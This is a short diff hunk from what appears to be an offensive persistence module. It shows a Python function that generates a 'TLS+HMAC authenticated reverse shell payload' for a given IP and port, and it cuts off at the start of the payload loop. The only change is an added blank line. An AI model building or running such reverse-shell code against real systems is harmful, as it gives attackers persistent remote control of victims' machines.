@@ -2,6 +2,7 @@
 Persistence Module - Various persistence techniques
 """
 
+
 def get_tls_payload(ip, port, secret):
     """Generate the TLS+HMAC authenticated reverse shell payload."""
     return f"""while($true){{try{{
